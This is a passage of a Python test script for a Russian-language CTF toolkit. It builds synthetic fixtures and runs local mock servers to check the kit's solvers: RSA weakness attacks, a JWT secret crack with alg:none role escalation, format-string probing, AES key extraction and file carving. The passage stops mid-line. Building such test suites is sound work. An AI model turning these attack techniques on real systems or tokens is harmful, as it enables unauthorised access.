    # 98. rsa auto: числа из текста, Ферма и малая экспонента
    p_a, q_a = 4294967291, 4294967279
    n_a = p_a * q_a
    e_a = 65537
    m_a = int.from_bytes(b"CTF{rsa}", "big")
    c_a = pow(m_a, e_a, n_a)
    rsa_file = os.path.join(tmp, "rsa_task.txt")
    with open(rsa_file, "w", encoding="utf-8") as f:
        f.write(f"The key:\nn = {n_a}\ne = {e_a}\nc = {c_a}\n")
    r = run("crypto/rsa_tool.py", "auto", rsa_file)
    small_e_file = os.path.join(tmp, "rsa_small_e.txt")
    m2 = int.from_bytes(b"hi", "big")
    with open(small_e_file, "w", encoding="utf-8") as f:
        f.write(f"e = 3\nn = {n_a}\nc = {m2 ** 3}\n")
    r2 = run("crypto/rsa_tool.py", "auto", small_e_file)
    check("crypto/rsa_tool.py auto",
          "CTF{rsa}" in r.stdout and "'hi'" in r2.stdout,
          r.stdout[-600:] + r2.stdout[-400:] + r.stderr)

    # 98b. rsa auto: утечка dp, smallq, n=p^k, e=1 (идеи из RsaCtfTool)
    from Crypto.Util.number import getPrime
    pz, qz = getPrime(256), getPrime(256)
    nz = pz * qz
    phz = (pz - 1) * (qz - 1)
    dz = pow(65537, -1, phz)
    mz = int.from_bytes(b"CTF{dp_leak}", "big")
    cz = pow(mz, 65537, nz)
    dp_file = os.path.join(tmp, "rsa_dp.txt")
    with open(dp_file, "w", encoding="utf-8") as f:
        f.write(f"n = {nz}\ne = 65537\ndp = {dz % (pz - 1)}\nc = {cz}\n")
    r = run("crypto/rsa_tool.py", "auto", dp_file)
    check("rsa auto dp leak", "CTF{dp_leak}" in r.stdout, r.stdout[-600:] + r.stderr)

    r = run("crypto/rsa_tool.py", "dp-leak", "--n", str(nz), "--e", "65537",
            "--dp", str(dz % (pz - 1)), "--cipher", str(cz))
    check("rsa dp-leak cmd", "CTF{dp_leak}" in r.stdout, r.stdout[-600:] + r.stderr)

    ps = getPrime(512)
    ns = ps * 10007
    msq = int.from_bytes(b"CTF{smallq}", "big")
    csq = pow(msq, 65537, ns)
    sq_file = os.path.join(tmp, "rsa_smallq.txt")
    with open(sq_file, "w", encoding="utf-8") as f:
        f.write(f"n = {ns}\ne = 65537\nc = {csq}\n")
    r = run("crypto/rsa_tool.py", "auto", sq_file)
    check("rsa auto smallq", "CTF{smallq}" in r.stdout, r.stdout[-600:] + r.stderr)

    pp = getPrime(128)
    npp = pp ** 3
    epp = 65537 if ((pp - 1) * pp * pp) % 65537 else 3
    mpp = int.from_bytes(b"CTF{ppow}", "big")
    cpp = pow(mpp, epp, npp)
    pp_file = os.path.join(tmp, "rsa_ppow.txt")
    with open(pp_file, "w", encoding="utf-8") as f:
        f.write(f"n = {npp}\ne = {epp}\nc = {cpp}\n")
    r = run("crypto/rsa_tool.py", "auto", pp_file)
    check("rsa auto perfect power", "CTF{ppow}" in r.stdout, r.stdout[-600:] + r.stderr)

    me = int.from_bytes(b"CTF{e_one}", "big")
    e1_file = os.path.join(tmp, "rsa_e1.txt")
    with open(e1_file, "w", encoding="utf-8") as f:
        f.write(f"n = {nz}\ne = 1\nc = {me}\n")
    r = run("crypto/rsa_tool.py", "auto", e1_file)
    check("rsa auto e=1", "CTF{e_one}" in r.stdout, r.stdout[-600:] + r.stderr)

    # 98c. rsa auto: PEM public (слабый n) и приватный ключ
    from Crypto.PublicKey import RSA as _RSAKey
    pwp = getPrime(256)
    nwp = pwp * 10007
    mwp = int.from_bytes(b"CTF{pem_pub}", "big")
    cwp = pow(mwp, 65537, nwp)
    pub = _RSAKey.construct((nwp, 65537))
    pem_file = os.path.join(tmp, "weak_public.pem")
    with open(pem_file, "wb") as f:
        f.write(pub.export_key())
    r = run("crypto/rsa_tool.py", "auto", pem_file, "--cipher", str(cwp))
    check("rsa auto pem public", "CTF{pem_pub}" in r.stdout, r.stdout[-600:] + r.stderr)

    kp = _RSAKey.generate(1024)
    mpr = int.from_bytes(b"CTF{pem_priv}", "big")
    cpr = pow(mpr, kp.e, kp.n)
    priv_file = os.path.join(tmp, "private.pem")
    with open(priv_file, "wb") as f:
        f.write(kp.export_key())
    r = run("crypto/rsa_tool.py", "auto", priv_file, "--cipher", str(cpr))
    check("rsa auto pem private", "CTF{pem_priv}" in r.stdout, r.stdout[-600:] + r.stderr)

    # 99. solve: JWT-шаг для текста с токеном
    jwt_txt = os.path.join(tmp, "jwt.txt")
    tok = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhYmMifQ.sig123456"
    with open(jwt_txt, "w", encoding="utf-8") as f:
        f.write("Authorization: Bearer " + tok + "\nnote: nothing\n")
    r = run("solve.py", jwt_txt, "--time", "20")
    check("solve.py jwt step", "JWT в тексте" in r.stdout, r.stdout[-700:] + r.stderr)

    # 100. vigenere-crack: флаг в начале текста не ломает ключ
    key_v = "qzlmw"
    plain_v = "CTF{vig} " + "the quick brown fox jumps over the lazy dog " * 6
    ct_v, ki = [], 0
    for ch in plain_v:
        if "a" <= ch <= "z":
            ct_v.append(chr((ord(ch) - 97 + ord(key_v[ki % len(key_v)]) - 97) % 26 + 97))
            ki += 1
        elif "A" <= ch <= "Z":
            ct_v.append(chr((ord(ch) - 65 + ord(key_v[ki % len(key_v)]) - 97) % 26 + 65))
            ki += 1
        else:
            ct_v.append(ch)
    r = run("crypto/classical.py", "vigenere-crack", "--text", "".join(ct_v))
    check("classical vigenere-crack flag", "CTF{vig}" in r.stdout, r.stdout[:400] + r.stderr)

    # 101. lsb --channel all: данные в одном канале всё равно находятся
    lsb_r = os.path.join(tmp, "lsb_r.png")
    write_png_with_lsb(lsb_r, b"CTF{lsb_r}")
    r = run("stego/lsb.py", lsb_r)
    check("stego/lsb.py per-channel", "CTF{lsb_r}" in r.stdout, r.stdout[:500] + r.stderr)

    # 102. rsa shared + SHA256-поток из одного JSON
    import hashlib as _hl
    p_s, q_s = 18446744073709551557, 18446744073709551533
    n_t = p_s * q_s
    key_s = b"session1"
    nonce_s = bytes(range(12))
    flag_s = "CTF{wrap_stream}"
    ct_s = bytearray()
    for i in range(0, len(flag_s), 32):
        ks = _hl.sha256(key_s + nonce_s + (i // 32).to_bytes(4, "big")).digest()
        ct_s += bytes(a ^ b for a, b in zip(flag_s.encode()[i:i + 32], ks))
    reg = {
        "target": "target-1",
        "public_exponent": 65537,
        "certificates": [
            {"id": "target-1", "n": str(n_t)},
            {"id": "other-1", "n": str(p_s * 4294967291)},
            {"id": "other-2", "n": str(18446744073709551551 * 4294967279)},
        ],
        "wrapped_session_key": str(pow(int.from_bytes(key_s, "big"), 65537, n_t)),
        "nonce": nonce_s.hex(),
        "ciphertext": bytes(ct_s).hex(),
    }
    reg_path = os.path.join(tmp, "registry.json")
    with open(reg_path, "w", encoding="utf-8") as f:
        json.dump(reg, f)
    r = run("crypto/rsa_tool.py", "shared", "--json", reg_path, "--target", "target-1",
            "--e", "65537", "--cipher-field", "wrapped_session_key")
    check("rsa shared+stream", "CTF{wrap_stream}" in r.stdout, r.stdout[-600:] + r.stderr)

    # 103. disasm: разбор себя (PE) и строковые ссылки
    r = run("reverse/disasm.py", PY, "--interesting", "--limit", "30")
    check("reverse/disasm.py", "0x" in r.stdout and ("call" in r.stdout or "mov" in r.stdout),
          r.stdout[:500] + r.stderr)

    # 104. oracle: пресет coprime на локальном сервисе
    import time as _time
    srv_path = os.path.join(tmp, "srv_coprime.py")
    with open(srv_path, "w", encoding="utf-8") as f:
        f.write(
            "import socket, random, math\n"
            "s=socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n"
            "s.bind(('127.0.0.1',31571)); s.listen(1)\n"
            "c,_=s.accept(); f=c.makefile('rwb')\n"
            "f.write(b'rounds\\n'); f.flush()\n"
            "ok=True\n"
            "for _ in range(4):\n"
            "    a=random.randint(2000,25000); b=random.randint(2000,25000)\n"
            "    f.write(f'{a} {b}\\n'.encode()); f.flush()\n"
            "    want='YES' if math.gcd(a,b)==1 else 'NO'\n"
            "    if f.readline().decode().strip()!=want: ok=False; break\n"
            "f.write(b'CTF{coprime_ok}\\n' if ok else b'CTF{fail}\\n'); f.flush()\n"
            "c.close(); s.close()\n")
    import subprocess as _sp
    srv = _sp.Popen([PY, srv_path], stdout=_sp.DEVNULL, stderr=_sp.DEVNULL)
    try:
        _time.sleep(1.0)
        r = run("pwn/oracle.py", "--connect", "127.0.0.1:31571", "--preset", "coprime",
                "--repeat", "8")
        check("oracle --preset coprime", "CTF{coprime_ok}" in r.stdout,
              r.stdout[-600:] + r.stderr)
    finally:
        srv.terminate()

    # 105. fmtstr auto: перебор %N$s по индексам
    srv_path = os.path.join(tmp, "srv_fmt.py")
    with open(srv_path, "w", encoding="utf-8") as f:
        f.write(
            "import socket\n"
            "s=socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n"
            "s.bind(('127.0.0.1',31572)); s.listen(20)\n"
            "for _ in range(6):\n"
            "    c,_=s.accept(); c.recv(200)\n"
            "    c.sendall(b'CTF{fmt_leak}\\n' if c else b'')\n"
            "    c.close()\n"
            "s.close()\n")
    srv = _sp.Popen([PY, srv_path], stdout=_sp.DEVNULL, stderr=_sp.DEVNULL)
    try:
        _time.sleep(1.0)
        r = run("pwn/fmtstr.py", "auto", "--connect", "127.0.0.1:31572",
                "--count", "4", "--timeout", "2")
        check("fmtstr auto", "CTF{fmt_leak}" in r.stdout, r.stdout[-600:] + r.stderr)
    finally:
        srv.terminate()

    # 106. aes auto: ключ строкой в бинарнике, CBC + нулевой IV
    from Crypto.Cipher import AES as _AES
    from Crypto.Util.Padding import pad as _pad
    key_t = b"0123456789abcdef0123456789abcdef"
    enc_bin = os.path.join(tmp, "encryptor.bin")
    with open(enc_bin, "wb") as f:
        f.write(b"\x7fELF junk\x00" + key_t + b"\x00get_encryption_key")
    plain_t = b"CTF{aes_auto_works} this is my message"
    ct = _AES.new(key_t, _AES.MODE_CBC, b"\x00" * 16).encrypt(_pad(plain_t, 16))
    enc_path = os.path.join(tmp, "secret.enc")
    with open(enc_path, "wb") as f:
        f.write(ct)
    r = run("crypto/aes_file.py", enc_path, "--auto", "--from-bin", enc_bin, "--top", "3")
    check("aes auto", "CTF{aes_auto_works}" in r.stdout, r.stdout[-600:] + r.stderr)

    # 107. jwt auto: слабый секрет + эскалация claim
    import base64 as _b64
    import hashlib as _hl2
    import hmac as _hmac

    def _b64u(b):
        return _b64.urlsafe_b64encode(b).rstrip(b"=").decode()

    hh = _b64u(b'{"alg":"HS256","typ":"JWT"}')
    pp = _b64u(b'{"sub":"user1","role":"user"}')
    sg = _b64u(_hmac.new(b"password", f"{hh}.{pp}".encode(), _hl2.sha256).digest())
    r = run("web/jwt_tool.py", "auto", f"{hh}.{pp}.{sg}")
    check("jwt auto", "password" in r.stdout and "alg:none" in r.stdout,
          r.stdout[-600:] + r.stderr)

    # 108. carve: ZIP внутри «тома» режется по EOCD и распаковывается
    frag = os.path.join(tmp, "fragment.bin")
    with open(frag, "wb") as f:
        f.write(b"STORAGE " + b"\x00" * 300 + make_zip_bytes("note.txt", b"CTF{carved_zip}")
                + b"TRAILER")
    outd = os.path.join(tmp, "carved")
    r = run("stego/carve.py", frag, "--out", outd)
    note = os.path.join(outd, "note.txt")
    check("carve zip by EOCD",
          "CTF{carved_zip}" in (open(note, encoding="utf-8").read() if os.path.exists(note) else ""),
          r.stdout[-600:] + r.stderr)

    # 109. wsl.py: --arch в help (aarch64 через qemu)
    r = run("linux/wsl.py", "run", "--help")
    check("linux/wsl.py help --arch", "--arch" in r.stdout and "aarch64" in r.stdout,
          r.stdout[-400:] + r.stderr)

    # 110. oracle --auto: сам определяет класс и закрепляет стратегию
    srv_path = os.path.join(tmp, "srv_auto_coprime.py")
    with open(srv_path, "w", encoding="utf-8") as f:
        f.write(
            "import socket, random, math\n"
            "s=socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n"
            "s.bind(('127.0.0.1',31591)); s.listen(1)\n"
            "c,_=s.accept(); f=c.makefile('rwb'); ok=True\n"
            "for i in range(12):\n"
            "    a=random.randint(2000,25000); b=random.randint(2000,25000)\n"
            "    f.write(f'Round {i}: Are {a} and {b} coprime? Answer YES or NO.\\n'.encode()); f.flush()\n"
            "    if f.readline().decode().strip().upper()!=('YES' if math.gcd(a,b)==1 else 'NO'):\n"
            "        ok=False; break\n"
            "f.write(b'CTF{auto_promote}\\n' if ok else b'CTF{fail}\\n'); f.flush()\n")
    srv = _sp.Popen([PY, srv_path], stdout=_sp.DEVNULL, stderr=_sp.DEVNULL)
    try:
        _time.sleep(1.0)
        r = run("pwn/oracle.py", "--connect", "127.0.0.1:31591", "--auto")
        check("oracle --auto promote",
              "CTF{auto_promote}" in r.stdout and "закрепляю" in r.stdout,
              r.stdout[-800:] + r.stderr)
    finally:
        srv.terminate()

    # 111. oracle --auto: неверная гипотеза -> переподключение -> другая
    srv_path = os.path.join(tmp, "srv_auto_switch.py")
    with open(srv_path, "w", encoding="utf-8") as f:
        f.write(
            "import socket, random\n"
            "s=socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n"
            "s.bind(('127.0.0.1',31592)); s.listen(5)\n"
            "while True:\n"
            "    c,_=s.accept(); f=c.makefile('rwb'); ok=True\n"
            "    for i in range(4):\n"
            "        a=random.randint(10,99); b=random.randint(10,99)\n"
            "        f.write(f'Calculate: {a} {b}\\n'.encode()); f.flush()\n"
            "        if f.readline().decode().strip()!=str(a+b): ok=False; break\n"
            "    f.write(b'CTF{auto_switch}\\n' if ok else b'wrong\\n'); f.flush(); c.close()\n"
            "    if ok: break\n")
    srv = _sp.Popen([PY, srv_path], stdout=_sp.DEVNULL, stderr=_sp.DEVNULL)
    try:
        _time.sleep(1.0)
        r = run("pwn/oracle.py", "--connect", "127.0.0.1:31592", "--auto",
                "--attempts", "4", "--promote", "3")
        check("oracle --auto switch",
              "CTF{auto_switch}" in r.stdout and "попытка 2" in r.stdout,
              r.stdout[-800:] + r.stderr)
    finally:
        srv.terminate()

    # 112. oracle --auto: гласные/согласные из кавычек
    srv_path = os.path.join(tmp, "srv_auto_vowels.py")
    with open(srv_path, "w", encoding="utf-8") as f:
        f.write(
            "import socket\n"
            "s=socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n"
            "s.bind(('127.0.0.1',31593)); s.listen(1)\n"
            "c,_=s.accept(); f=c.makefile('rwb'); ok=True\n"
            "for w in ['hello world','stack overflow','ctf']:\n"
            "    f.write(f'How many vowels and consonants in \"{w}\"?\\n'.encode()); f.flush()\n"
            "    v=sum(ch in 'aeiou' for ch in w); c2=sum(ch.isalpha() and ch not in 'aeiou' for ch in w)\n"
            "    if f.readline().decode().strip()!=f'{v} {c2}': ok=False; break\n"
            "f.write(b'CTF{auto_vowels}\\n' if ok else b'wrong\\n'); f.flush()\n")
    srv = _sp.Popen([PY, srv_path], stdout=_sp.DEVNULL, stderr=_sp.DEVNULL)
    try:
        _time.sleep(1.0)
        r = run("pwn/oracle.py", "--connect", "127.0.0.1:31593", "--auto")
        check("oracle --auto vowels", "CTF{auto_vowels}" in r.stdout,
              r.stdout[-800:] + r.stderr)
    finally:
        srv.terminate()

    # 113. FlagGrabber: флаг кусками, в ANSI, zero-width и base64
    sys.path.insert(0, KIT)
    import common as _common
    g = _common.FlagGrabber()
    g.feed(b"\x1b[32mInnoCTF{ab\x1b[0m")
    got_split = g.feed(b"c_def}")
    g.feed_text("CTF{ze\u200bro}")
    g.feed_text("Q1RGe2I2NF9mbGFnfQ==")
    check("FlagGrabber split/ansi/zw/base64",
          "InnoCTF{abc_def}" in g.found and "CTF{zero}" in g.found
          and "CTF{b64_flag}" in g.found,
          f"найдено: {g.found}")

    # 114. game_bot: разбор типов задач
    r = run("misc/game_bot.py", "--analyze", "Угадай слово из 5 букв: _ _ _ _ _")
    check("game_bot analyze wordle", "wordle" in r.stdout and "длина=5" in r.stdout,
          r.stdout + r.stderr)
    r = run("misc/game_bot.py", "--analyze", "Are 100 and 35 coprime? YES or NO")
    check("game_bot analyze qa", "вопрос" in r.stdout, r.stdout + r.stderr)
    r = run("misc/game_bot.py", "--analyze", "Нажми q. Стамина: 100")
    check("game_bot analyze keys", "клавиши" in r.stdout, r.stdout + r.stderr)

    # 115. game_bot: Q&A по TCP
    srv_path = os.path.join(tmp, "srv_game_qa.py")
    with open(srv_path, "w", encoding="utf-8") as f:
        f.write(
            "import socket, math\n"
            "s=socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n"
            "s.bind(('127.0.0.1',31621)); s.listen(1)\n"
            "c,_=s.accept(); f=c.makefile('rwb'); ok=True\n"
            "for i in range(5):\n"
            "    a,b=2222+i,3333+i*7\n"
            "    f.write(f'Are {a} and {b} coprime? Answer YES or NO.\\n'.encode()); f.flush()\n"
            "    if f.readline().decode().strip().upper()!=('YES' if math.gcd(a,b)==1 else 'NO'):\n"
            "        ok=False; break\n"
            "f.write(b'CTF{game_qa}\\n' if ok else b'wrong\\n'); f.flush()\n")
    srv = _sp.Popen([PY, srv_path], stdout=_sp.DEVNULL, stderr=_sp.DEVNULL)
    try:
        _time.sleep(1.0)
        r = run("misc/game_bot.py", "--connect", "127.0.0.1:31621", "--auto")
        check("game_bot qa", "CTF{game_qa}" in r.stdout, r.stdout[-700:] + r.stderr)
    finally:
        srv.terminate()

    # 116. game_bot: Wordle (эмодзи-разметка, два раунда)
    wdict = os.path.join(tmp, "words5.txt")
    with open(wdict, "w", encoding="utf-8") as f:
        f.write("\n".join(["серия", "карие", "телок", "пенку", "мешку", "аорте",
                           "лерки", "серин", "сумка", "паром", "ветер", "замок",
                           "книга", "столб", "мышка", "полка", "ручка", "дочка",
                           "точка", "ночка", "кочка"]) + "\n")
    srv_path = os.path.join(tmp, "srv_game_wordle.py")
    with open(srv_path, "w", encoding="utf-8") as f:
        f.write(
            "import socket\n"
            "def fb(g,t):\n"
            "    r=['b']*len(g); c={}\n"
            "    for ch in t: c[ch]=c.get(ch,0)+1\n"
            "    for i,(a,b) in enumerate(zip(g,t)):\n"
            "        if a==b: r[i]='g'; c[a]-=1\n"
            "    for i,a in enumerate(g):\n"
            "        if r[i]=='b' and c.get(a,0)>0: r[i]='y'; c[a]-=1\n"
            "    return r\n"
            "s=socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n"
            "s.bind(('127.0.0.1',31622)); s.listen(1)\n"
            "c,_=s.accept(); f=c.makefile('rwb')\n"
            "for _ in range(2):\n"
            "    f.write('Угадай слово из 5 букв\\n'.encode()); f.flush()\n"
            "    for _ in range(6):\n"
            "        g=f.readline().decode().strip().lower()\n"
            "        f.write((''.join({'g':'🟩','y':'🟨','b':'⬛'}[x] for x in fb(g,'серия'))+'\\n').encode()); f.flush()\n"
            "        if g=='серия': break\n"
            "f.write(b'CTF{game_wordle}\\n'); f.flush()\n")
    srv = _sp.Popen([PY, srv_path], stdout=_sp.DEVNULL, stderr=_sp.DEVNULL)
    try:
        _time.sleep(1.0)
        r = run("misc/game_bot.py", "--connect", "127.0.0.1:31622", "--auto",
                "--words", wdict)
        check("game_bot wordle", "CTF{game_wordle}" in r.stdout,
              r.stdout[-900:] + r.stderr)
    finally:
        srv.terminate()

    # 117. game_bot: клавиши + стамина
    srv_path = os.path.join(tmp, "srv_game_keys.py")
    with open(srv_path, "w", encoding="utf-8") as f:
        f.write(
            "import socket\n"
            "s=socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n"
            "s.bind(('127.0.0.1',31623)); s.listen(1)\n"
            "c,_=s.accept(); f=c.makefile('rwb')\n"
            "f.write('Нажми q чтобы ускориться. Стамина: 100\\n'.encode()); f.flush()\n"
            "ok=True\n"
            "for i in range(5):\n"
            "    if f.read(1)!=b'q': ok=False; break\n"
            "    f.write(f'Стамина: {90-i*10}\\n'.encode()); f.flush()\n"
            "f.write(b'CTF{game_keys}\\n' if ok else b'fail\\n'); f.flush()\n")
    srv = _sp.Popen([PY, srv_path], stdout=_sp.DEVNULL, stderr=_sp.DEVNULL)
    try:
        _time.sleep(1.0)
        r = run("misc/game_bot.py", "--connect", "127.0.0.1:31623", "--auto",
                "--keys", "q", "--interval", "0.01")
        check("game_bot keys", "CTF{game_keys}" in r.stdout,
              r.stdout[-700:] + r.stderr)
    finally:
        srv.terminate()

    # 118. game_bot: плагин подхватывается по баннеру
    plugdir = os.path.join(tmp, "plugins")
    os.makedirs(plugdir, exist_ok=True)
    with open(os.path.join(plugdir, "plug.py"), "w", encoding="utf-8") as f:
        f.write(
            "def move(text, state):\n"
            "    n = state.get('n', 0); state['n'] = n + 1\n"
            "    return 'ping' if n == 0 else 'bye'\n"
            "PLUGIN = {'name': 'pingpong', 'kind': 'interactive',\n"
            "          'match': {'banner': r'PINGPONG'}, 'move': move}\n")
    srv_path = os.path.join(tmp, "srv_game_plug.py")
    with open(srv_path, "w", encoding="utf-8") as f:
        f.write(
            "import socket\n"
            "s=socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n"
            "s.bind(('127.0.0.1',31624)); s.listen(1)\n"
            "c,_=s.accept(); f=c.makefile('rwb')\n"
            "f.write(b'PINGPONG v1\\n'); f.flush()\n"
            "f.readline(); f.write(b'pong\\n'); f.flush()\n"
            "f.readline(); f.write(b'CTF{game_plugin}\\n'); f.flush()\n")
    srv = _sp.Popen([PY, srv_path], stdout=_sp.DEVNULL, stderr=_sp.DEVNULL)
    try:
        _time.sleep(1.0)
        r = run("misc/game_bot.py", "--connect", "127.0.0.1:31624",
                "--plugins-dir", plugdir)
        check("game_bot plugin", "CTF{game_plugin}" in r.stdout,
              r.stdout[-700:] + r.stderr)
    finally:
        srv.terminate()

    # 119. буквенные маркеры Wordle + перерисовка экрана
    sys.path.insert(0, os.path.join(KIT, "misc"))
    import wordle_bot as _wb
    parsed = _wb.parse_feedback("серия\nГ Ж С С С", 5)
    check("wordle cyr marks",
          bool(parsed) and parsed[0] == "vec" and parsed[1] == ["g", "y", "b", "b", "b"],
          repr(parsed))
    parsed = _wb.parse_feedback("серия\n1 1 1 1 1", 5)
    check("wordle raw marks",
          bool(parsed) and parsed[0] == "raw" and len(parsed[1]) == 5,
          repr(parsed))
    scr = _common.Screen()
    scr.feed("\x1b[2Jabc\rX\n\x1b[1;1Htop")
    check("screen redraw", scr.text().splitlines()[0] == "top", repr(scr.text()))

    # 120. ppc_solvers: батарея типовых PPC-вопросов (RU/EN)
    sys.path.insert(0, os.path.join(KIT, "pwn"))
    import ppc_solvers as _ppc
    _cases = [
        ("2 + 2 * 2", "6"),
        ("12 ? 5 = 17", "+"),
        ("Is 97 prime?", "YES"),
        ("Следующее простое число после 100?", "101"),
        ("How many divisors does 36 have?", "9"),
        ("Чему равен НОД чисел 48 и 18?", "6"),
        ("factorial of 5", "120"),
        ("Какое 10-е число Фибоначчи?", "55"),
        ("Reverse the string 'hello'", "olleh"),
        ("Отсортируй по возрастанию: 5 3 9 1", "1 3 5 9"),
        ("Продолжи последовательность: 2, 4, 6, 8", "10"),
        ("Какой день недели 2026-11-08?", "воскресенье"),
    ]
    _bad = [(t, w, _ppc.solve(t)) for t, w in _cases if _ppc.solve(t) != w]
    check("ppc solvers batch", not _bad, repr(_bad[:3]))

    # 121. ppc_solvers: BFS по лабиринту
    _grid = "#####\n#S..#\n#.#.#\n#..E#\n#####"
    _path = _ppc.solve_grid_path(_grid)
    check("ppc grid path", bool(_path) and set(_path) <= set("WASD"), repr(_path))

    # 122. game_bot: угадайка бинарным поиском
    srv_path = os.path.join(tmp, "srv_game_guess.py")
    with open(srv_path, "w", encoding="utf-8") as f:
        f.write(
            "import socket\n"
            "s=socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n"
            "s.bind(('127.0.0.1',31633)); s.listen(1)\n"
            "c,_=s.accept(); f=c.makefile('rwb')\n"
            "f.write('Угадай число от 1 до 100. Я скажу больше/меньше.\\n'.encode()); f.flush()\n"
            "target=73; ok=False\n"
            "for _ in range(9):\n"
            "    g=int(f.readline().decode().strip())\n"
            "    if g==target:\n"
            "        f.write('верно!\\n'.encode()); f.flush(); ok=True; break\n"
            "    f.write(('больше\\n' if target>g else 'меньше\\n').encode()); f.flush()\n"
            "f.write(b'CTF{guess_test}\\n' if ok else b'fail\\n'); f.flush()\n")
    srv = _sp.Popen([PY, srv_path], stdout=_sp.DEVNULL, stderr=_sp.DEVNULL)
    try:
        _time.sleep(1.0)
        r = run("misc/game_bot.py", "--connect", "127.0.0.1:31633", "--auto")
        check("game_bot guess", "CTF{guess_test}" in r.stdout,
              r.stdout[-700:] + r.stderr)
    finally:
        srv.terminate()

    # 123. carve: JPEG не обрезается по миниатюре внутри APP1
    _thumb = b"\xff\xd8\xff\xd9"
    _app1_payload = b"Exif\x00\x00" + _thumb
    _app1 = b"\xff\xe1" + (len(_app1_payload) + 2).to_bytes(2, "big") + _app1_payload
    _sos = b"\xff\xda" + (8).to_bytes(2, "big") + b"\x01\x01\x00\x00\x3f\x00"
    _jpeg = b"\xff\xd8" + _app1 + _sos + b"\x12\x34\x56" + b"\xff\xd9"
    _host = os.path.join(tmp, "host_jpeg.bin")
    open(_host, "wb").write(b"JUNKJUNK" + _jpeg + b"TAILTAIL")
    _out = os.path.join(tmp, "carve_jpeg")
    r = run("stego/carve.py", _host, "--out", _out)
    _jpg_files = ([f for f in os.listdir(_out) if f.endswith(".jpg")]
                  if os.path.isdir(_out) else [])
    _ok = bool(_jpg_files) and open(os.path.join(_out, _jpg_files[0]), "rb").read() == _jpeg
    check("carve jpeg boundary", _ok, r.stdout[-400:] + r.stderr)

    # 124. carve: GIF не обрезается по 0x3B внутри LZW-данных
    _gif = (b"GIF89a" + b"\x01\x00\x01\x00\x00\x00\x00"
            + b"\x2c" + b"\x00\x00\x00\x00\x01\x00\x01\x00\x00"
            + b"\x02" + b"\x05" + b"\x3b\x3b\x3b\x3b\x3b" + b"\x00" + b"\x3b")
    _host = os.path.join(tmp, "host_gif.bin")
    open(_host, "wb").write(b"HOSTHOST" + _gif + b"TAIL")
    _out = os.path.join(tmp, "carve_gif")
    r = run("stego/carve.py", _host, "--out", _out)
    _gif_files = ([f for f in os.listdir(_out) if f.endswith(".gif")]
                  if os.path.isdir(_out) else [])
    _ok = bool(_gif_files) and open(os.path.join(_out, _gif_files[0]), "rb").read() == _gif
    check("carve gif boundary", _ok, r.stdout[-400:] + r.stderr)

    # 125. carve: TAR начинается с заголовка (а не с 257) и не тянет мусор
    _buf = io.BytesIO()
    with tarfile.open(fileobj=_buf, mode="w") as _tf:
        _blob = b"CTF{tar_boundary}"
        _ti = tarfile.TarInfo("flag.txt")
        _ti.size = len(_blob)
        _tf.addfile(_ti, io.BytesIO(_blob))
    _tar = _buf.getvalue()
    _host = os.path.join(tmp, "host_tar.bin")
    open(_host, "wb").write(b"PREFIX!!" + _tar + b"JUNKJUNK")
    _out = os.path.join(tmp, "carve_tar")
    r = run("stego/carve.py", _host, "--out", _out)
    _tar_files = ([f for f in os.listdir(_out) if f.endswith(".tar")]
                  if os.path.isdir(_out) else [])
    _ok = False
    if _tar_files:
        _raw = open(os.path.join(_out, _tar_files[0]), "rb").read()
        try:
            with tarfile.open(fileobj=io.BytesIO(_raw)) as _tf2:
                _member = _tf2.extractfile("flag.txt").read()
            _ok = _member == _blob and not _raw.endswith(b"JUNKJUNK")
        except Exception:
            _ok = False
    check("carve tar boundary", _ok, r.stdout[-400:] + r.stderr)

    # 126. ipa_info: Payload/Info.plist и строки
    ipa_path = os.path.join(tmp, "app.ipa")
    with zipfile.ZipFile(ipa_path, "w") as zf:
        zf.writestr("Payload/Test.app/Info.plist", plistlib.dumps({
            "CFBundleIdentifier": "com.example.test",
            "CFBundleExecutable": "Test",
            "CFBundleURLTypes": [{"CFBundleURLSchemes": ["testapp"]}],
        }, fmt=plistlib.FMT_BINARY))
        zf.writestr("Payload/Test.app/Test",
                    b"\xcf\xfa\xed\xfe" + b"\x00" * 64 + b"CTF{ipa_flag}")
    r = run("forensic/ipa_info.py", ipa_path)
    check("forensic/ipa_info.py",
          "com.example.test" in r.stdout and "testapp" in r.stdout
          and "CTF{ipa_flag}" in r.stdout, r.stdout[-600:] + r.stderr)

    # 127. icmp_payloads: склейка payload и декод
    from scapy.all import Ether as _Ether, ICMP as _ICMP, IP as _IP
    from scapy.all import Raw as _Raw, wrpcap as _wrpcap
    icmp_path = os.path.join(tmp, "icmp.pcap")
    _pkts = [_Ether() / _IP(src="1.1.1.1", dst="2.2.2.2")
             / _ICMP(type=8, id=7, seq=i + 1) / _Raw(part)
             for i, part in enumerate([b"CTF{icmp_", b"channel}"])]
    _wrpcap(icmp_path, _pkts)
    r = run("network/icmp_payloads.py", icmp_path)
    check("network/icmp_payloads.py", "CTF{icmp_channel}" in r.stdout,
          r.stdout[-600:] + r.stderr)

    # 128. geo_photo: EXIF + ссылки обратного поиска
    geo_path = os.path.join(tmp, "geo.jpg")
    _im = Image.new("RGB", (16, 16), (100, 100, 100))
    _ex = Image.Exif()
    _ex[0x010F] = "TestMake"
    _ex[0x0110] = "TestModel"
    _im.save(geo_path, exif=_ex)
    r = run("forensic/geo_photo.py", geo_path)
    check("forensic/geo_photo.py",
          "TestMake" in r.stdout and "yandex.com/images" in r.stdout,
          r.stdout[-600:] + r.stderr)

    # 129. evm_decode: селектор transfer и аргументы
    _cd = ("0xa9059cbb" + "0" * 24 + "11" * 20
           + format(123456789, "064x"))
    r = run("blockchain/evm_decode.py", _cd)
    check("blockchain/evm_decode.py",
          "transfer(address,uint256)" in r.stdout
